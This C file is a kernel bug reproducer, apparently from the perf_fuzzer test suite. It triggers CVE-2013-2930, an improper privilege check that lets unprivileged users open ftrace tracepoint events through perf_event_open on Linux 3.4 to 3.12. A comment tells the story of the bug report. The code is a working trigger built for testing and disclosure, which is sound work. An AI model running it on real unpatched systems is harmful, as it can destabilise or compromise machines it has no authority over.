/* log_to_code output from ./broken_trace/new.broken.7			*/
/* by Vince Weaver <vincent.weaver _at_ maine.edu			*/

/* Found with modified perf_fuzzer with random seed 1382550501		*/

/* Triggers on 3.4 to 3.12 at least, but see below */
/* Problem introduced with ced39002f5ea736b716ae233fb68b26d59783912 	*/
/*	due to an improper check on perf_paranoid_kernel()		*/

/* Fixed with:	12ae030d54ef250706da5642fc7697cc60ad0df7		*/
/* This reproduce may only work on older machines.  It is possible	*/
/*	to trigger this bug in other ways, via trinity and perf_fuzzer  */
/* CVE-2013-2930							*/

/* Need advanced ftrace options enabled to trigger this one
   all available at least by 3.0
CONFIG_FUNCTION_TRACER=y
CONFIG_FUNCTION_GRAPH_TRACER=y
CONFIG_STACK_TRACER=y
CONFIG_DYNAMIC_FTRACE=y
CONFIG_FTRACE_MCOUNT_RECORD=y
CONFIG_FUNCTION_PROFILER=y

Both Dave Jones and I found the bug independently with our fuzzers, but
the ftrace people kept ignoring us for months saying "can't happen".

Finally I laboriously narrowed down a short repro testcase,
and posted it to lkml and my git perf_test suite on 24 October 2013.
Still ignored.

Finally I tracked down the actual bug (after wasting a day bisecting
kernels to a wrong point caused by a misfeature in my testcode).

The bug was they intended perf/ftrace to only be usable by root, but
the perf_paranoid_kernel() check they used doesn't do what it says it
does.

So finally after weeks of wasted effort I report this to lkml on
5 November 2013.

Only to get an e-mail from the ftrace people (off list) saying they found
and reported this problem literally hours ago and were trying to keep it
hush-hush and off list as a major issue they just discovered.

fun times.

*/

#define _GNU_SOURCE 1
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include <signal.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/ioctl.h>
#include <sys/prctl.h>
#include <poll.h>
#include <errno.h>

//#include <linux/hw_breakpoint.h>

#include "perf_event.h"

int fd[1024];
struct perf_event_attr pe[1024];
char *mmap_result[1024];

long long id;

int forked_pid;

struct sigaction sa;
static int overflows=0;

static void our_handler(int signum, siginfo_t *info, void *uc) {
//	int fd = info->si_fd;

	overflows++;
//	ioctl(fd,PERF_EVENT_IOC_DISABLE,0);
//	if (sigios) return;
//	ret=ioctl(fd, PERF_EVENT_IOC_REFRESH,1);
}

int perf_event_open(struct perf_event_attr *hw_event_uptr,
	pid_t pid, int cpu, int group_fd, unsigned long flags) {

	return syscall(__NR_perf_event_open,hw_event_uptr, pid, cpu,
		group_fd, flags);
}

int main(int argc, char **argv) {
/* 1 */

	memset(&pe[5],0,sizeof(struct perf_event_attr));
	pe[5].type=PERF_TYPE_TRACEPOINT;
	pe[5].size=64;

	/* The upper bits are ignored so this maps to */
	/* event_id of 1 */
	/* debugfs/events/ftrace/function/id   1      */
	pe[5].config=0x7fffffff00000001ULL;

	pe[5].sample_period=0xffffffffff000000ULL;

	pe[5].sample_type=PERF_SAMPLE_IP|PERF_SAMPLE_TIME|PERF_SAMPLE_READ|
		PERF_SAMPLE_ID|PERF_SAMPLE_PERIOD;

	fd[5]=perf_event_open(&pe[5],0,0,-1,0 /*0*/ );

	if (fd[5]<0) {
		printf("Error opening event: %s\n",strerror(errno));
		printf("This means the bug won't trigger, kernel probably too old\n");
	}

	/* below not needed if you run the test twice? */

/* 2 */
//#if 0
	memset(&sa, 0, sizeof(struct sigaction));
	sa.sa_sigaction = our_handler;
	sa.sa_flags = SA_SIGINFO;
	if (sigaction( SIGRTMIN+2, &sa, NULL) < 0) {
		printf("Error setting up signal handler\n");
	}
	fcntl(fd[5], F_SETFL, O_RDWR|O_NONBLOCK|O_ASYNC);
	fcntl(fd[5], F_SETSIG, SIGRTMIN+2);
	fcntl(fd[5], F_SETOWN,getpid());
//#endif
	/* Replayed 2 syscalls */
	return 0;
}
